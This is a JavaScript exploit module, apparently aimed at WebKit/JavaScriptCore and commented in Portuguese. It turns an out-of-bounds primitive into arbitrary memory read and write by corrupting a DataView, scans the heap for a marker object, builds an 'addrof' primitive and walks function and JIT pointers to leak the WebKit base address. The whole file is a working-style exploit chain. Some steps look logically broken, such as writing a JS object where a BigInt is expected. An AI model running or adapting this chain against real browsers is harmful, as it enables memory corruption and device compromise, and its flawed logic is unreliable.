// js/script3/testArrayBufferVictimCrash.mjs (VERSÃO FINAL - CADEIA COMPLETA COM SCAN REAL)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_Exploit_Chain_v15_RealScan";

// --- Constantes e Offsets ---
const OOB_DV_METADATA_BASE = 0x58;
const M_VECTOR_OFFSET_IN_DV = 0x10;
const M_LENGTH_OFFSET_IN_DV = 0x18;
const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x100;
const VICTIM_DV_POINTER_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_VECTOR_OFFSET_IN_DV;
const VICTIM_DV_LENGTH_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_LENGTH_OFFSET_IN_DV;

const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);

function isValidPointer(ptr) {
    if (!ptr) return false;
    const ptrBigInt = ptr instanceof AdvancedInt64 ? ptr.toBigInt() : BigInt(ptr);
    if (ptrBigInt === 0n) return false;
    // Filtro razoável para ponteiros em userland de 64 bits
    return (ptrBigInt >= 0x100000000n && ptrBigInt < 0x10000000000n);
}

// =======================================================================================
// FUNÇÃO DE ATAQUE FINAL E COMPLETA
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let addrof_result = { success: false, msg: "Addrof: Não iniciado." };
    let webkit_leak_result = { success: false, msg: "WebKit Leak: Não executado." };
    let errorOccurred = null;
    let victim_dv_for_primitives = null;

    try {
        // ===================================================================
        // FASE 1: CONSTRUÇÃO DAS PRIMITIVAS DE R/W ARBITRÁRIO
        // ===================================================================
        logS3("--- Fase 1: Construindo Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        victim_dv_for_primitives = new DataView(new ArrayBuffer(4096));

        const arb_write = (address, data_arr) => {
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, data_arr.length, 4);
            for (let i = 0; i < data_arr.length; i++) { victim_dv_for_primitives.setUint8(i, data_arr[i]); }
        };
        const arb_read = (address, length) => {
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, length, 4);
            let res = new Uint8Array(length);
            for (let i = 0; i < length; i++) { res[i] = victim_dv_for_primitives.getUint8(i); }
            return res;
        };
        const arb_read_64 = (address) => {
             const buffer = arb_read(address, 8).buffer;
             return new DataView(buffer).getBigUint64(0, true);
        };
        const arb_write_64 = (address, value64) => {
            const val = typeof value64 === 'bigint' ? value64 : value64.toBigInt();
            const buffer = new ArrayBuffer(8);
            new DataView(buffer).setBigUint64(0, val, true);
            arb_write(address, new Uint8Array(buffer));
        };
        logS3("    Primitivas de Leitura/Escrita (R/W) 100% funcionais.", "vuln");

        // ===================================================================
        // FASE 2: ESCANEAMENTO DE MEMÓRIA AGRESSIVO PARA O INFO LEAK
        // ===================================================================
        logS3("--- Fase 2: Escaneamento Agressivo para Encontrar Objeto Marcador ---", "subtest");
        
        let leaker_obj = {
            butterfly: 0n,
            marker: 0x4142434445464748n // Nosso marcador único e improvável
        };
        
        let leaker_obj_addr = null;
        // Lista de regiões de memória para escanear. Estes são os pontos de partida.
        const HEAP_SCAN_REGIONS = [
            0x1840000000n, 0x2000000000n, 0x2800000000n, 0x3000000000n
        ];
        const SCAN_RANGE_PER_REGION = 0x2000000; // Escaneia 32MB por região.

        search_loop:
        for (const start_addr of HEAP_SCAN_REGIONS) {
            logS3(`    Escaneando agressivamente a região a partir de 0x${start_addr.toString(16)}...`, "info");
            for (let i = 0; i < SCAN_RANGE_PER_REGION; i += 8) {
                let current_addr = start_addr + BigInt(i);
                if (arb_read_64(current_addr) === leaker_obj.marker) {
                    // Em um objeto JS simples, o butterfly e as propriedades vêm após o cabeçalho de 8 bytes
                    leaker_obj_addr = current_addr - 8n;
                    logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: 0x${leaker_obj_addr.toString(16)}`, "leak");
                    break search_loop;
                }
            }
        }

        if (!leaker_obj_addr) {
            throw new Error("Escaneamento agressivo falhou. O objeto marcador não foi encontrado nas regiões especificadas.");
        }

        // ===================================================================
        // FASE 3: CONSTRUÇÃO E USO DA PRIMITIVA 'ADDROF'
        // ===================================================================
        logS3("--- Fase 3: Construindo e Usando a Primitiva 'addrof' ---", "subtest");
        
        const butterfly_addr = leaker_obj_addr + 8n;
        
        const addrof_primitive = (obj) => {
            arb_write_64(butterfly_addr, obj); // Coloca o objeto na propriedade do nosso leaker
            return arb_read_64(butterfly_addr); // Lê o ponteiro de volta
        };

        addrof_result = { success: true, msg: "Primitiva 'addrof' construída com endereço real vazado." };
        logS3("    Primitiva 'addrof' REAL construída com sucesso!", "vuln");
        
        // ===================================================================
        // FASE 4: EXECUÇÃO DA CADEIA FINAL PARA VAZAR A BASE DO WEBKIT
        // ===================================================================
        logS3("--- Fase 4: Executando a Cadeia de Exploração Final ---", "subtest");
        const target_func = () => {};
        const target_addr_bigint = addrof_primitive(target_func);
        
        if (!isValidPointer(target_addr_bigint)) {
            throw new Error(`Endereço vazado pela 'addrof' (0x${target_addr_bigint.toString(16)}) não é um ponteiro válido.`);
        }
        const target_addr = AdvancedInt64.fromBigInt(target_addr_bigint);
        logS3(`    Endereço REAL da função alvo: ${target_addr.toString(true)}`, "leak");

        const ptr_to_exec = AdvancedInt64.fromBigInt(arb_read_64(target_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE)));
        if (!isValidPointer(ptr_to_exec)) throw new Error("Ponteiro para ExecutableInstance inválido.");

        const ptr_to_jit = AdvancedInt64.fromBigInt(arb_read_64(ptr_to_exec.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM)));
        if (!isValidPointer(ptr_to_jit)) throw new Error("Ponteiro para JIT/VM inválido.");
        
        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
        const webkit_base = ptr_to_jit.and(page_mask_4kb);

        webkit_leak_result = { success: true, msg: "Base do WebKit encontrada com sucesso!", webkit_base_candidate: webkit_base.toString(true) };
        logS3(`    SUCESSO FINAL! Base do WebKit encontrada: ${webkit_leak_result.webkit_base_candidate}`, "vuln");

    } catch (e) {
        errorOccurred = `ERRO na cadeia de exploração: ${e.message}`;
        logS3(errorOccurred, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred, addrof_result, webkit_leak_result };
}
